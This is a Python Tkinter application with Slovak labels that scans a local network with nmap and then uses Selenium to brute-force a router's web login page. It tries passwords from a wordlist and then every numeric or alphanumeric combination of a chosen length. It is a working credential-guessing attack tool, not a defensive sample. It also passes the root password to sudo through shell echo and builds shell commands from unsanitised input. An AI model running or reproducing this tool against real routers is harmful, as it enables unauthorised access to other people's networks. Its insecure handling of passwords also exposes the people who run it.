import tkinter as tk             # GUI
from tkinter import ttk          # GUI
# import random                    # Random
import os                        # os command
import platform                  # os info
import subprocess                # subprocess
from selenium import webdriver
from selenium.webdriver.common.by import By
# from selenium.webdriver.common.keys import Keys
import itertools
import string
import time

os_name = platform.system()
timesleep = 9
ip_pc = []

def read_password_list(file_path):
    """Číta heslá zo súboru a vráti ich ako zoznam."""
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

# Funkcia na získanie hodnoty z posuvníka
def aktualizovat_dlzku_hesla(value):
    dlzka_hesla_var.set(int(float(value)))  # Aktualizuje dĺžku hesla

def aktualizovat_timesleep(value):
    timesleep_var.set(int(float(value)))    # Aktualizuje time.sleep

def zobrazit_nmap_vystup(nmap_output):
    # Vytvorenie nového okna
    nove_okno = tk.Toplevel(root)
    nove_okno.title("Výstup z Nmap")

    # Textový widget na zobrazenie údajov
    text_widget = tk.Text(nove_okno, wrap="word", width=80, height=20)
    text_widget.insert("1.0", nmap_output)  # Vložíme výstup z nmap do textového widgetu
    text_widget.config(state="disabled")  # Zamedzíme editáciu
    text_widget.pack(padx=10, pady=10, fill="both", expand=True)

    # Tlačidlo na zatvorenie okna
    close_button = ttk.Button(nove_okno, text="Zatvoriť", command=nove_okno.destroy)
    close_button.pack(pady=10)
    
def heslo_vystup(password, usli_cas):
    # Vytvorenie nového okna
    nove_okno = tk.Toplevel(root)
    nove_okno.title("Výstup z Nmap")

    # Textový widget na zobrazenie údajov
    text_widget = tk.Text(nove_okno, wrap="word", width=80, height=20)
    text_widget.insert("1.0", "Potvrdene heslo je :" + password + "\nHeslo sa naslo za:" + usli_cas + " St")  # Vložíme výstup z nmap do textového widgetu
    text_widget.config(state="disabled")  # Zamedzíme editáciu
    text_widget.pack(padx=10, pady=10, fill="both", expand=True)

    # Tlačidlo na zatvorenie okna
    close_button = ttk.Button(nove_okno, text="Zatvoriť", command=nove_okno.destroy)
    close_button.pack(pady=10)

                                #Kontrola instalacie nmap 
def is_nmap_installed():
    """Kontrola, či je nmap nainštalovaný."""
    try:
        subprocess.run(["nmap", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError:
        return False
    except FileNotFoundError:
        return False

                            # Pocitanie casu prelomu 
def generovat_heslo():
    try:
        # Získanie hodnoty dĺžky hesla z posuvníka
        dlzka_hesla = dlzka_hesla_var.get()
        typ_hesla = typ_hesla_var.get()
        timesleep = timesleep_var.get()  # Získanie hodnoty time.sleep z posuvníka

        # Validácia typu hesla
        if typ_hesla == "Číselné":
            znaky = 10
            moznosti = znaky ** dlzka_hesla
        elif typ_hesla == "Alfanumerické":
            znaky = 62
            moznosti = znaky ** dlzka_hesla
        else:
            vysledok_label.config(text="Vyberte typ hesla!")
            return None

        # Výpočet dĺžky lámania hesla
        dlzka_lamanie = round(((timesleep * moznosti) / 60 / 60 / 24), 2)

        # Zobrazenie výsledku
        vysledok_label.config(text=f"""Vygenerované heslo má {moznosti} možností.
                              Odhadovaná dĺžka pri time.sleep {timesleep} je {dlzka_lamanie} dní""")
    except ValueError:
        # Chybové hlásenie pri neplatných vstupoch
        vysledok_label.config(text="Zadajte platnú hodnotu dĺžky hesla!")

        
    except ValueError:
        vysledok_label.config(text="Vyberte platnú dĺžku hesla!")
    print (str(dlzka_hesla))
    dlzka_hesla = int(dlzka_hesla)
    return dlzka_hesla
    
                            # Tlacidlo nmap
def spustit_ifconfig():
    root_password = password_entry.get()
    if not root_password:
        vysledok_label.config(text="Zadajte root heslo!")
        return root_password
    if os_name == "Linux":
        os.system  (f"echo {root_password} | sudo -S apt install net-tools -y")
        ip_pc = subprocess.getoutput("ip -4 addr | grep inet | awk '{print $2}'").splitlines()
        ip_pc = ip_pc[0]
        ip_router = subprocess.getoutput("ip route | grep 'default' | awk '{print $3}'")
    elif os_name == "Windows":
        ip_pc = subprocess.getoutput("ipconfig | findstr IPv4").split(":")[-1].strip()
        ip_router = subprocess.getoutput("ipconfig | findstr Gateway").split(":")[-1].strip()
    elif os_name == "Darwin":   # MAC
        ip_pc = subprocess.getoutput("ifconfig en0 | grep 'inet ' | awk '{print $2}'")
        ip_router = subprocess.getoutput("ipconfig getoption en0 router")
    else:
        ip_pc = "Neznáme"
        ip_router = "Neznáme"
    vysledok_label.config(text=f"IP PC: {ip_pc}\nIP Router: {ip_router}")

                        # Tlacidlo nmap
def spustit_nmap():
    root_password = password_entry.get()
    if not root_password:
        vysledok_label.config(text="Zadajte root heslo!")
        
    if os_name == "Linux":
        if not is_nmap_installed():
            try:
                vysledok_label.config(text="Nmap nie je nainštalovaný, prebieha inštalácia...")
                subprocess.run(
                    ["sudo", "-S", "apt-get", "install", "-y", "nmap"],
                    input=root_password + "\n",
                    text=True,
                    check=True
                )
                vysledok_label.config(text="Nmap bol úspešne nainštalovaný.")
            except subprocess.CalledProcessError:
                vysledok_label.config(text="Nepodarilo sa nainštalovať nmap. Skontrolujte heslo alebo pripojenie.")   
        try:
            subprocess.run(
                ["sudo", "-S", "nmap", "-v", "scanme.nmap.org"],
                input=root_password + "\n",
                text=True,
                check=True
            )
            vysledok_label.config(text="Spustil sa príkaz: nmap na Linuxe.")
        except subprocess.CalledProcessError:
            vysledok_label.config(text="Príkaz zlyhal: nesprávne heslo alebo problém s nmap.")
    elif os_name == "Windows":
        if not is_nmap_installed():
            vysledok_label.config(text="Nmap nie je nainštalovaný. Nainštalujte ho manuálne z https://nmap.org/download.html")
            
        try:
            result = subprocess.getoutput("nmap -v scanme.nmap.org")
            vysledok_label.config(text=f"Spustil sa príkaz: nmap na Windows.\n{result}")
        except Exception as e:
            vysledok_label.config(text=f"Chyba pri spustení nmap na Windows: {e}")
    elif os_name == "Darwin":  # macOS
        if not is_nmap_installed():
            try:
                os.system(f"echo {root_password} | /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"")
                os.system("sudo brew install nmap")
                vysledok_label.config(text="Nmap bol úspešne nainštalovaný na macOS.")
            except Exception as e:
                vysledok_label.config(text=f"Chyba pri inštalácii nmap na macOS: {e}")    
        try:
            subprocess.run(
                ["sudo", "-S", "nmap", "-v", "scanme.nmap.org"],
                input=root_password + "\n",
                text=True,
                check=True
            )
            vysledok_label.config(text="Spustil sa príkaz: nmap na macOS.")
        except subprocess.CalledProcessError:
            vysledok_label.config(text="Príkaz zlyhal: nesprávne heslo alebo problém s nmap.")
    else:
        vysledok_label.config(text="Tento operačný systém nie je podporovaný pre nmap.")
    
    ip_router = ip_entry.get()
    print (f"nmap {ip_router}")
    nmap_output = subprocess.getoutput(f"nmap {ip_router}")
    print(" Nmap premenna " + nmap_output)
    zobrazit_nmap_vystup(nmap_output)
    target_ip = password_crack_entry.get()
    return target_ip

# Funkcia na spustenie brute force z tlačidla
def brute_force_router():
    ROUTER_URL = password_crack_entry.get()
    print(ROUTER_URL)
    
    # Browser nastavenie
    driver = webdriver.Chrome()
    driver.get("http://" + ROUTER_URL)
    start_time = time.time()
    dlzka_hesla = int(dlzka_hesla_var.get())
    timesleep = int(timesleep_slider.get())
    print(dlzka_hesla)
    print(timesleep)
    # Najprv skúsiť heslá zo súboru
    password_file = 'password_list.txt'
    try:
        passwords = read_password_list(password_file)
        for password in passwords:
            print(f"Skúšam heslo zo zoznamu: {password}")
            password_field = driver.find_element(By.ID, "password")
            password_field.clear()
            time.sleep(1)

            password_field.send_keys(password)
            time.sleep(timesleep)

            login_button = driver.find_element(By.ID, "button")
            login_button.click()
            time.sleep(1)

            if "Zadajte heslo" not in driver.page_source:
                print(f"Heslo nájdené: {password}")
                usli_cas = str(round(((time.time() - start_time) / 60**2), 3))
                heslo_vystup(password, usli_cas)
                driver.quit()
                return  # Heslo bolo nájdené, ukončiť funkciu
    except Exception as e:
        print(f"Chyba pri čítaní zoznamu hesiel: {e}")

    # Pokračovať generovaním číselných hesiel
    for password in generate_passwords(dlzka_hesla):
        try:
            print(f"Skúšam generované heslo: {password}")
            password_field = driver.find_element(By.ID, "password")
            password_field.clear()
            time.sleep(1)
            password_field.send_keys(password)
            time.sleep(timesleep)
            login_button = driver.find_element(By.ID, "button")
            login_button.click()
            time.sleep(1)
            if "Zadajte heslo" not in driver.page_source:
                print(f"Heslo nájdené: {password}")
                usli_cas = str(round(((time.time() - start_time) / 60**2), 3))
                heslo_vystup(password, usli_cas)
                break
        except Exception as e:
            print(f"Chyba: {e}")
    # Chrome closse
    # driver.quit()
    
# Funkcia na skúšanie hesla
def try_password(driver, password):
    try:
        print(f"Skúšam heslo: {password}")

        # Nájdeme pole na heslo a zadáme heslo
        password_field = driver.find_element(By.ID, "password")
        password_field.clear()
        password_field.send_keys(password)
        time.sleep(1)

        # Nájdeme a stlačíme tlačidlo na prihlásenie
        login_button = driver.find_element(By.ID, "button")
        login_button.click()
        time.sleep(2)

        # Kontrola, či sme prihlásení
        if "Netzwerk" in driver.page_source:  # Podmienka úspešného prihlásenia
            return True
    except Exception as e:
        print(f"Chyba pri skúšaní hesla {password}: {e}")
    return False

# Generátor hesiel
def generate_passwords(length,):
    """
    Generuje hesla o zadané délce.
    :param length: Délka hesla.
    :param include_letters: Pokud True, zahrne i písmena.
    :return: Generátor hesel.
    """
    cislo_pismena = typ_hesla_var.get()
    print (cislo_pismena)
    if cislo_pismena == "Alfanumerické":
        characters = string.ascii_letters + string.digits  # Písmena (malá + velká) a číslice
    else:
        characters = string.digits  # Pouze číslice
    
    return (''.join(p) for p in itertools.product(characters, repeat=length))

# Hlavné okno
root = tk.Tk()
root.title("Rozšírený Generátor Hesiel")
root.geometry("1000x600")

# Premenné pre dĺžku hesla a time.sleep
dlzka_hesla_var = tk.IntVar(value=8)  # Predvolená hodnota dĺžky hesla
timesleep_var = tk.IntVar(value=2)   # Predvolená hodnota time.sleep

# Nastavenie dĺžky hesla
dlzka_hesla_label = ttk.Label(root, text="Nastavte dĺžku hesla:")
dlzka_hesla_label.grid(row=0, column=0, padx=10, pady=10, sticky="e")

dlzka_hesla_slider = ttk.Scale(
    root,
    from_=1,
    to=20,
    orient="horizontal",
    command=aktualizovat_dlzku_hesla
)
dlzka_hesla_slider.set(dlzka_hesla_var.get())
dlzka_hesla_slider.grid(row=0, column=1, padx=10, pady=10, sticky="w")

dlzka_hesla_display = ttk.Label(root, textvariable=dlzka_hesla_var)
dlzka_hesla_display.grid(row=0, column=2, padx=10, pady=10, sticky="w")

# Nastavenie typu hesla
typ_hesla_label = ttk.Label(root, text="Typ hesla:")
typ_hesla_label.grid(row=1, column=0, padx=10, pady=10, sticky="e")

typ_hesla_var = tk.StringVar(value="Vyberte typ hesla")
typ_hesla_dropdown = ttk.Combobox(
    root, textvariable=typ_hesla_var, values=["Číselné", "Alfanumerické"], state="readonly"
)
typ_hesla_dropdown.grid(row=1, column=1, padx=10, pady=10, sticky="w")

# Tlačidlo na generovanie hesla
generovat_button = ttk.Button(root, text="Generovat heslo", command=generovat_heslo)
generovat_button.grid(row=2, column=1, padx=10, pady=10, sticky="w")

# Zadanie root hesla
password_label = ttk.Label(root, text="Root heslo:")
password_label.grid(row=3, column=0, padx=10, pady=10, sticky="e")

password_entry = ttk.Entry(root, show="*")
password_entry.grid(row=3, column=1, padx=10, pady=10, sticky="w")

# Nastavenie IP routera
ip_label = ttk.Label(root, text="IP router:")
ip_label.grid(row=3, column=2, padx=10, pady=10, sticky="w")

ip_entry = ttk.Entry(root)
ip_entry.grid(row=3, column=3, padx=10, pady=10, sticky="w")

# Gombík na spustenie ifconfig/ipconfig
ifconfig_button = ttk.Button(root, text="Spustiť ifconfig/ipconfig", command=spustit_ifconfig)
ifconfig_button.grid(row=4, column=0, padx=10, pady=10, sticky="w")

# Nastavenie time.sleep
timesleep_label = ttk.Label(root, text="Time sleep:")
timesleep_label.grid(row=5, column=0, padx=10, pady=10, sticky="e")

timesleep_slider = ttk.Scale(
    root,
    from_=1,
    to=20,
    orient="horizontal",
    command=aktualizovat_timesleep
)
timesleep_slider.set(timesleep_var.get())
timesleep_slider.grid(row=5, column=1, padx=10, pady=10, sticky="w")

timesleep_display = ttk.Label(root, textvariable=timesleep_var)
timesleep_display.grid(row=5, column=2, padx=10, pady=10, sticky="w")

# Gombík na spustenie nmap
nmap_button = ttk.Button(root, text="Spustiť nmap", command=spustit_nmap)
nmap_button.grid(row=6, column=0, padx=10, pady=10, sticky="w")

# Zadanie cieľovej IP
password_crack_label = ttk.Label(root, text="Target IP")
password_crack_label.grid(row=7, column=0, padx=10, pady=10, sticky="e")

password_crack_entry = ttk.Entry(root)
password_crack_entry.grid(row=7, column=1, padx=10, pady=10, sticky="w")

# Gombík na spustenie brute force
target_button = ttk.Button(root, text="Target", command=brute_force_router)
target_button.grid(row=8, column=0, padx=10, pady=10, sticky="w")

# Tlačidlo na ukončenie aplikácie
ukoncit_button = ttk.Button(root, text="Ukončiť", command=root.destroy)
ukoncit_button.grid(row=9, column=0, padx=10, pady=(0, 10), sticky="sw")

# Výsledok
vysledok_label = ttk.Label(root, text="", foreground="green")
vysledok_label.grid(row=10, column=0, columnspan=2, padx=10, pady=10, sticky="w")

# Spustenie hlavnej slučky
root.mainloop()
